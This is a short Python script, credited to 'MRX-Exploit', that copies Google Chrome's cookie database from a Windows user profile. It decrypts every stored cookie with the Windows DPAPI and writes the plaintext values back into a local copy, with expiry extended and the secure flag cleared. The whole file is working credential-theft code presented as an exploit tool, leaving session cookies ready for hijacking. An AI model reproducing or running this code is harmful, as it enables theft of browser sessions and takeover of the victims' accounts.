#--------------------------coded by Hazem Hesham (MRX-Exploit)--------------------------
from os import getenv
from shutil import copyfile
import sqlite3
#--------------------------HANDLING--------------------------
try:
        import win32crypt 
except:
        print('Error to run this script please install pypwin32 \nusing pip install pypiwin32')
        exit(1)
else:
        pass


#--------------------------NOTE--------------------------
print("NOTE: This script get Google Chrome Cookies only :D")

#--------------------------START--------------------------
copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", './Cookies')
 
connect = sqlite3.connect('./Cookies')
cursor = connect.cursor()


cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
for host_key, name, value, encrypted_value in cursor.fetchall():
	
	decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

	cursor.execute('\
		UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, secure = 0\
		WHERE host_key = ?\
		AND name = ?',
		(decrypted_value, host_key, name));
#--------------------------END--------------------------
connect.commit()
connect.close()
